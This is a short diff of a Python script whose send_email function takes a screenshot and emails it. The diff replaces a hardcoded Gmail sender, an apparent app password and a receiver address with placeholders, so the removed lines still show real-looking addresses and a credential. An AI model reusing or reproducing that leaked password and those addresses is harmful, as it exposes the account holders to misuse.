@@ -25,9 +25,9 @@ def send_email():
 
     take_screenshot()
            
-    email_sender = "abdulkarimmaslouk4@gmail.com"
-    email_password = "uzeikxfcxjejpxmu"
-    email_receiver = "musaadrar9@gmail.com"
+    email_sender = "@gmail.com"
+    email_password = "[password]"
+    email_receiver = "@gmail.com"
 
     subject = "Screenshot"
     body = "Attachment: "
